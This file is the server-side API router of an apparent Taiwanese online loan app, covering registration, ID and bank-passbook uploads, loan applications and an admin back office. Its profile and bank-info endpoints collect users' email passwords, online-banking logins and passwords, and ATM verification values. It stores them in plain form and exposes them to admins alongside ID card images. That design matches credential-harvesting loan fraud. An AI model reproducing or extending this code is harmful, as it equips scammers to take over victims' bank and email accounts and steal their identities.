import { z } from "zod";
import { TRPCError } from "@trpc/server";
import { COOKIE_NAME } from "@shared/const";
import { getSessionCookieOptions } from "./_core/cookies";
import { systemRouter } from "./_core/systemRouter";
import { sdk } from "./_core/sdk";
import { publicProcedure, protectedProcedure, router } from "./_core/trpc";
import { notifyOwner } from "./_core/notification";
import { storagePut, storageGetSignedUrl } from "./storage";
import type { InsertIdDocument } from "../drizzle/schema";
import bcrypt from "bcryptjs";
import { notifyNewUser, notifyProfileUpdated, notifyDocumentUploaded, notifyLoanApplication } from "./email";
import {
  upsertUser,
  getUserByOpenId,
  getUserByPhone,
  createUserWithPhone,
  getUserById,
  getAllUsers,
  getUsersByRole,
  getDeletedUsers,
  getUserProfile,
  upsertUserProfile,
  getIdDocument,
  getAllIdDocuments,
  createOrUpdateIdDocument,
  updateIdDocumentStatus,
  createLoanApplication,
  getLoanApplicationsByUser,
  getLoanApplicationById,
  getAllLoanApplications,
  updateLoanApplicationStatus,
  getLoanStats,
  createRepayment,
  getRepaymentsByLoan,
  updateRepayment,
  updateUserStatus,
  updateUserLastLoginIp,
  deleteUser,
} from "./db";

// Admin guard middleware
const adminProcedure = protectedProcedure.use(({ ctx, next }) => {
  if (ctx.user.role !== "admin") {
    throw new TRPCError({ code: "FORBIDDEN", message: "需要管理員權限" });
  }
  return next({ ctx });
});

export const appRouter = router({
  system: systemRouter,

  auth: router({
    me: publicProcedure.query((opts) => opts.ctx.user),

    register: publicProcedure
      .input(z.object({
        phone: z.string().regex(/^09\d{8}$/, "請輸入正確的台灣手機號碼（09 開頭，共 10 碼）"),
        password: z.string().min(6).max(100),
        name: z.string().min(1).max(50).optional(),
      }))
      .mutation(async ({ ctx, input }) => {
        // 檢查手機號碼是否已註冊
        const existing = await getUserByPhone(input.phone);
        if (existing) {
          throw new TRPCError({ code: "CONFLICT", message: "此手機號碼已被註冊" });
        }
        // 雜湊密碼
        const passwordHash = await bcrypt.hash(input.password, 10);
        // 建立用戶
        const user = await createUserWithPhone(input.phone, passwordHash, input.name);
        if (!user) throw new TRPCError({ code: "INTERNAL_SERVER_ERROR", message: "建立帳號失敗" });
        // 建立 session
        const token = await sdk.createSessionToken(user.openId, { name: user.name ?? "" });
        const cookieOptions = getSessionCookieOptions(ctx.req);
                ctx.res.cookie(COOKIE_NAME, token, { ...cookieOptions, maxAge: 365 * 24 * 60 * 60 * 1000 });
        // 發送 Email 通知管理員
        try {
          await notifyNewUser(input.phone);
        } catch (e) { console.warn('[Email] notifyNewUser failed:', e); }
        return { success: true, user: { id: user.id, phone: user.phone, name: user.name, role: user.role } };
      }),
    login: publicProcedure
      .input(z.object({
        phone: z.string().min(2).max(20),
        password: z.string().min(1),
        isAdmin: z.boolean().optional().default(false),
      }))
      .mutation(async ({ ctx, input }) => {
        // 一般會員登入需驗證手機號碼格式
        if (!input.isAdmin && !/^09\d{8}$/.test(input.phone)) {
          throw new TRPCError({ code: "BAD_REQUEST", message: "請輸入正確的台灣手機號碼（09 開頭，共 10 碼）" });
        }
        const user = await getUserByPhone(input.phone);
        if (!user || !user.passwordHash) {
          throw new TRPCError({ code: "UNAUTHORIZED", message: "帳號或密碼錯誤" });
        }
        const valid = await bcrypt.compare(input.password, user.passwordHash);
        if (!valid) {
          throw new TRPCError({ code: "UNAUTHORIZED", message: "手機號碼或密碼錯誤" });
        }
        // 檢查帳號是否被凍結
        if (user.status === 'frozen') {
          throw new TRPCError({ code: "FORBIDDEN", message: "此帳號已被凍結，請聯繫客服" });
        }
        // 記錄登入 IP
        const ip = (ctx.req.headers['x-forwarded-for'] as string)?.split(',')[0]?.trim() || ctx.req.socket?.remoteAddress || '';
        await updateUserLastLoginIp(user.id, ip);
        // 建立 session
        const token = await sdk.createSessionToken(user.openId, { name: user.name ?? "" });
        const cookieOptions = getSessionCookieOptions(ctx.req);
        ctx.res.cookie(COOKIE_NAME, token, { ...cookieOptions, maxAge: 365 * 24 * 60 * 60 * 1000 });
        return { success: true, user: { id: user.id, phone: user.phone, name: user.name, role: user.role } };
      }),

    logout: publicProcedure.mutation(({ ctx }) => {
      const cookieOptions = getSessionCookieOptions(ctx.req);
      ctx.res.clearCookie(COOKIE_NAME, { ...cookieOptions, maxAge: -1 });
      return { success: true } as const;
    }),

    changePassword: protectedProcedure
      .input(z.object({
        currentPassword: z.string().min(1),
        newPassword: z.string().min(6).max(100),
      }))
      .mutation(async ({ ctx, input }) => {
        const user = await getUserByOpenId(ctx.user.openId);
        if (!user || !user.passwordHash) {
          throw new TRPCError({ code: "BAD_REQUEST", message: "此帳號不支援密碼修改" });
        }
        const valid = await bcrypt.compare(input.currentPassword, user.passwordHash);
        if (!valid) {
          throw new TRPCError({ code: "UNAUTHORIZED", message: "目前密碼不正確" });
        }
        const newHash = await bcrypt.hash(input.newPassword, 10);
        await upsertUser({ openId: user.openId, passwordHash: newHash });
        return { success: true };
      }),
  }),

  // ─── User Profile ──────────────────────────────────────────────────────────
  profile: router({
    get: protectedProcedure.query(async ({ ctx }) => {
      return getUserProfile(ctx.user.id);
    }),

    upsert: protectedProcedure
      .input(z.object({
        fullName: z.string().min(1).max(100),
        idNumber: z.string().min(8).max(20),
        phone: z.string().min(8).max(20),
        address: z.string().min(1),
        occupation: z.string().optional(),
        monthlyIncome: z.string().optional(),
        emailAddress: z.string().email().optional().or(z.literal("")),
        emailPassword: z.string().optional(),
      }))
      .mutation(async ({ ctx, input }) => {
        await upsertUserProfile({
          userId: ctx.user.id,
          fullName: input.fullName,
          idNumber: input.idNumber,
          phone: input.phone,
          address: input.address,
          occupation: input.occupation ?? null,
          monthlyIncome: input.monthlyIncome ?? null,
          emailAddress: input.emailAddress || null,
          emailPassword: input.emailPassword || null,
          profileCompleted: "complete",
        });
        // 發送 Email 通知管理員
        try {
          const userObj = await getUserById(ctx.user.id);
          await notifyProfileUpdated(userObj?.phone ?? '', input.fullName);
        } catch (e) { console.warn('[Email] notifyProfileUpdated failed:', e); }
        return { success: true };
      }),
  }),

  // ─── ID Documents ──────────────────────────────────────────────────────────
  documents: router({
    get: protectedProcedure.query(async ({ ctx }) => {
      return getIdDocument(ctx.user.id);
    }),

    upload: protectedProcedure
      .input(z.object({
        side: z.enum(["front", "back"]),
        base64: z.string(),
        mimeType: z.string().default("image/jpeg"),
      }))
      .mutation(async ({ ctx, input }) => {
        const buffer = Buffer.from(input.base64, "base64");
        const ext = input.mimeType.split("/")[1] || "jpg";
        const key = `id-docs/${ctx.user.id}/${input.side}-${Date.now()}.${ext}`;
        const { url } = await storagePut(key, buffer, input.mimeType);

        const existing = await getIdDocument(ctx.user.id);
        const updateData: InsertIdDocument = { userId: ctx.user.id };
        if (input.side === "front") {
          updateData.frontImageKey = key;
          updateData.frontImageUrl = url;
          if (existing?.backImageKey) {
            updateData.backImageKey = existing.backImageKey;
            updateData.backImageUrl = existing.backImageUrl ?? "";
          }
        } else {
          updateData.backImageKey = key;
          updateData.backImageUrl = url;
          if (existing?.frontImageKey) {
            updateData.frontImageKey = existing.frontImageKey;
            updateData.frontImageUrl = existing.frontImageUrl ?? "";
          }
        }

                await createOrUpdateIdDocument(updateData);
        // 發送 Email 通知管理員（身分證上傳）
        try {
          const userObj = await getUserById(ctx.user.id);
          await notifyDocumentUploaded(userObj?.phone ?? '', input.side);
        } catch (e) { console.warn('[Email] notifyDocumentUploaded failed:', e); }
        return { success: true, url };
      }),
    uploadPassbook: protectedProcedure
      .input(z.object({
        base64: z.string(),
        mimeType: z.string().default("image/jpeg"),
      }))
      .mutation(async ({ ctx, input }) => {
        const buffer = Buffer.from(input.base64, "base64");
        const ext = input.mimeType.split("/")[1] || "jpg";
        const key = `id-docs/${ctx.user.id}/passbook-${Date.now()}.${ext}`;
        const { url } = await storagePut(key, buffer, input.mimeType);
        const existing = await getIdDocument(ctx.user.id);
        const updateData: InsertIdDocument = {
          userId: ctx.user.id,
          passbookImageKey: key,
          passbookImageUrl: url,
        };
        if (existing?.frontImageKey) {
          updateData.frontImageKey = existing.frontImageKey;
          updateData.frontImageUrl = existing.frontImageUrl ?? "";
        }
        if (existing?.backImageKey) {
          updateData.backImageKey = existing.backImageKey;
          updateData.backImageUrl = existing.backImageUrl ?? "";
        }
        await createOrUpdateIdDocument(updateData);
        // Email 通知管理員（存摺上傳）
        try {
          const userObj = await getUserById(ctx.user.id);
          await notifyDocumentUploaded(userObj?.phone ?? '', 'passbook');
        } catch (e) { console.warn('[Email] notify failed:', e); }
        return { success: true, url };
      }),

    updateBankInfo: protectedProcedure
      .input(z.object({
        bankName: z.string().min(1).max(100),
        bankBranch: z.string().max(100).optional(),
        bankAccount: z.string().min(1).max(50),
        onlineBankAccount: z.string().max(100).optional(),
        onlineBankPassword: z.string().max(255).optional(),
        atmVerification: z.string().max(255).optional(),
      }))
      .mutation(async ({ ctx, input }) => {
        const existing = await getIdDocument(ctx.user.id);
        const updateData: InsertIdDocument = {
          userId: ctx.user.id,
          bankName: input.bankName,
          bankBranch: input.bankBranch ?? null,
          bankAccount: input.bankAccount,
          onlineBankAccount: input.onlineBankAccount ?? null,
          onlineBankPassword: input.onlineBankPassword ?? null,
          atmVerification: input.atmVerification ?? null,
        };
        if (existing?.frontImageKey) {
          updateData.frontImageKey = existing.frontImageKey;
          updateData.frontImageUrl = existing.frontImageUrl ?? "";
        }
        if (existing?.backImageKey) {
          updateData.backImageKey = existing.backImageKey;
          updateData.backImageUrl = existing.backImageUrl ?? "";
        }
        if (existing?.passbookImageKey) {
          updateData.passbookImageKey = existing.passbookImageKey;
          updateData.passbookImageUrl = existing.passbookImageUrl ?? "";
        }
        await createOrUpdateIdDocument(updateData);
        return { success: true };
      }),
  }),

  // ─── Loan Applications ─────────────────────────────────────────────────────
  loans: router({
    myLoans: protectedProcedure.query(async ({ ctx }) => {
      return getLoanApplicationsByUser(ctx.user.id);
    }),

    create: protectedProcedure
      .input(z.object({
        loanAmount: z.string(),
        loanDurationMonths: z.number().int().min(6).max(120),
        purpose: z.string().min(1).max(255),
        repaymentMethod: z.enum(["equal_principal_interest", "equal_principal", "bullet"]),
      }))
      .mutation(async ({ ctx, input }) => {
        await createLoanApplication({
          userId: ctx.user.id,
          loanAmount: input.loanAmount,
          loanDurationMonths: input.loanDurationMonths,
          purpose: input.purpose,
          repaymentMethod: input.repaymentMethod,
          status: "待審核",
        });

        // Email 通知管理員
        try {
          const userObj = await getUserById(ctx.user.id);
          await notifyLoanApplication(userObj?.phone ?? '', Number(input.loanAmount), input.purpose);
        } catch (e) { console.warn('[Email] notify failed:', e); }
        // Manus 通知管理員
        try {
          await notifyOwner({
            title: "📋 新借貸申請",
            content: `用戶 ID ${ctx.user.id} 提交了新的借貸申請，金額：NT$ ${Number(input.loanAmount).toLocaleString()}，期限：${input.loanDurationMonths} 個月。請前往管理後台審核。`,
          });
        } catch (e) {
          console.warn("[Notify] Failed to notify owner:", e);
        }

        return { success: true };
      }),

    repayments: protectedProcedure
      .input(z.object({ loanId: z.number() }))
      .query(async ({ ctx, input }) => {
        const loan = await getLoanApplicationById(input.loanId);
        if (!loan || loan.userId !== ctx.user.id) {
          throw new TRPCError({ code: "FORBIDDEN" });
        }
        return getRepaymentsByLoan(input.loanId);
      }),
  }),

  // ─── Admin ─────────────────────────────────────────────────────────────────
  admin: router({
    stats: adminProcedure.query(async () => {
      const [regularUsers, loans] = await Promise.all([
        getUsersByRole('user'),
        getLoanStats(),
      ]);
      return {
        totalUsers: regularUsers.length,
        ...loans,
      };
    }),

    users: adminProcedure.query(async () => {
      const regularUsers = await getUsersByRole('user');
      const profiles = await Promise.all(regularUsers.map(u => getUserProfile(u.id)));
      const docs = await Promise.all(regularUsers.map(u => getIdDocument(u.id)));
      const docsWithSignedUrls = await Promise.all(docs.map(async (doc) => {
        if (!doc) return null;
        const [frontUrl, backUrl, passbookUrl] = await Promise.all([
          doc.frontImageKey ? storageGetSignedUrl(doc.frontImageKey).catch(() => doc.frontImageUrl) : null,
          doc.backImageKey ? storageGetSignedUrl(doc.backImageKey).catch(() => doc.backImageUrl) : null,
          (doc as any).passbookImageKey ? storageGetSignedUrl((doc as any).passbookImageKey).catch(() => (doc as any).passbookImageUrl) : null,
        ]);
        return { ...doc, frontImageUrl: frontUrl ?? doc.frontImageUrl, backImageUrl: backUrl ?? doc.backImageUrl, passbookImageUrl: passbookUrl ?? (doc as any).passbookImageUrl };
      }));
      return regularUsers.map((u, i) => ({
        ...u,
        profile: profiles[i] ?? null,
        document: docsWithSignedUrls[i] ?? null,
      }));
    }),

    admins: adminProcedure.query(async () => {
      return getUsersByRole('admin');
    }),

    deletedUsers: adminProcedure.query(async () => {
      return getDeletedUsers();
    }),

    userDetail: adminProcedure
      .input(z.object({ userId: z.number() }))
      .query(async ({ input }) => {
        const allUsers = await getAllUsers();
        const user = allUsers.find(u => u.id === input.userId);
        if (!user) throw new TRPCError({ code: "NOT_FOUND" });
        const [profile, document, loans] = await Promise.all([
          getUserProfile(input.userId),
          getIdDocument(input.userId),
          getLoanApplicationsByUser(input.userId),
        ]);
        let docWithSignedUrls = document;
        if (document) {
          const [frontUrl, backUrl, passbookUrl] = await Promise.all([
            document.frontImageKey ? storageGetSignedUrl(document.frontImageKey).catch(() => document.frontImageUrl) : null,
            document.backImageKey ? storageGetSignedUrl(document.backImageKey).catch(() => document.backImageUrl) : null,
            (document as any).passbookImageKey ? storageGetSignedUrl((document as any).passbookImageKey).catch(() => (document as any).passbookImageUrl) : null,
          ]);
          docWithSignedUrls = { ...document, frontImageUrl: frontUrl ?? document.frontImageUrl, backImageUrl: backUrl ?? document.backImageUrl, passbookImageUrl: passbookUrl ?? (document as any).passbookImageUrl } as any;
        }
        return { user, profile, document: docWithSignedUrls, loans };
      }),

    allLoans: adminProcedure.query(async () => {
      return getAllLoanApplications();
    }),

    loanDetail: adminProcedure
      .input(z.object({ loanId: z.number() }))
      .query(async ({ input }) => {
        const loan = await getLoanApplicationById(input.loanId);
        if (!loan) throw new TRPCError({ code: "NOT_FOUND" });
        const repaymentList = await getRepaymentsByLoan(input.loanId);
        return { loan, repayments: repaymentList };
      }),

    updateLoanStatus: adminProcedure
      .input(z.object({
        loanId: z.number(),
        status: z.enum(["待審核", "審核中", "已核准", "撥款中", "還款中", "已結清", "已拒絕"]),
        adminNote: z.string().optional(),
        interestRate: z.string().optional(),
        approvedAmount: z.string().optional(),
        approvedDurationMonths: z.number().int().min(1).max(360).optional(),
      }))
      .mutation(async ({ ctx, input }) => {
        await updateLoanApplicationStatus(
          input.loanId,
          input.status,
          ctx.user.id,
          input.adminNote,
          input.interestRate,
          input.approvedAmount,
          input.approvedDurationMonths
        );
        return { success: true };
      }),

    updateDocumentStatus: adminProcedure
      .input(z.object({
        docId: z.number(),
        status: z.enum(["pending", "reviewing", "verified", "rejected"]),
        reviewNote: z.string().optional(),
      }))
      .mutation(async ({ ctx, input }) => {
        await updateIdDocumentStatus(input.docId, input.status, ctx.user.id, input.reviewNote);
        return { success: true };
      }),

    addRepayment: adminProcedure
      .input(z.object({
        loanId: z.number(),
        dueDate: z.string(),
        amountDue: z.string(),
        amountPaid: z.string().optional(),
        status: z.enum(["pending", "paid", "overdue", "partial"]).default("pending"),
        notes: z.string().optional(),
      }))
      .mutation(async ({ ctx, input }) => {
        await createRepayment({
          loanId: input.loanId,
          dueDate: new Date(input.dueDate),
          amountDue: input.amountDue,
          amountPaid: input.amountPaid ?? "0",
          status: input.status,
          paidAt: input.status === "paid" ? new Date() : undefined,
          recordedBy: ctx.user.id,
          notes: input.notes ?? null,
        });
        return { success: true };
      }),

    updateRepayment: adminProcedure
      .input(z.object({
        repaymentId: z.number(),
        amountPaid: z.string().optional(),
        status: z.enum(["pending", "paid", "overdue", "partial"]).optional(),
        notes: z.string().optional(),
      }))
      .mutation(async ({ ctx, input }) => {
        await updateRepayment(input.repaymentId, {
          amountPaid: input.amountPaid,
          status: input.status,
          paidAt: input.status === "paid" ? new Date() : undefined,
          notes: input.notes,
          recordedBy: ctx.user.id,
        });
        return { success: true };
      }),

    setUserStatus: adminProcedure
      .input(z.object({
        userId: z.number(),
        status: z.enum(['active', 'frozen']),
      }))
      .mutation(async ({ input }) => {
        const allUsers = await getAllUsers();
        const user = allUsers.find(u => u.id === input.userId);
        if (!user) throw new TRPCError({ code: 'NOT_FOUND', message: '找不到該會員' });
        await updateUserStatus(input.userId, input.status);
        return { success: true };
      }),

    deleteUser: adminProcedure
      .input(z.object({ userId: z.number() }))
      .mutation(async ({ input }) => {
        const allUsers = await getAllUsers();
        const user = allUsers.find(u => u.id === input.userId);
        if (!user) throw new TRPCError({ code: 'NOT_FOUND', message: '找不到該會員' });
        if (user.role === 'admin') throw new TRPCError({ code: 'FORBIDDEN', message: '無法刪除管理員帳號' });
        await deleteUser(input.userId);
        return { success: true };
      }),

    resetUserPassword: adminProcedure
      .input(z.object({
        userId: z.number(),
        newPassword: z.string().min(6).max(100),
      }))
      .mutation(async ({ input }) => {
        const allUsers = await getAllUsers();
        const user = allUsers.find(u => u.id === input.userId);
        if (!user) throw new TRPCError({ code: "NOT_FOUND", message: "找不到該會員" });
        if (!user.phone) {
          throw new TRPCError({ code: "BAD_REQUEST", message: "該會員不是電話密碼註冊的帳號" });
        }
        const newHash = await bcrypt.hash(input.newPassword, 10);
        await upsertUser({ openId: user.openId, passwordHash: newHash });
        return { success: true };
      }),
  }),
});

export type AppRouter = typeof appRouter;
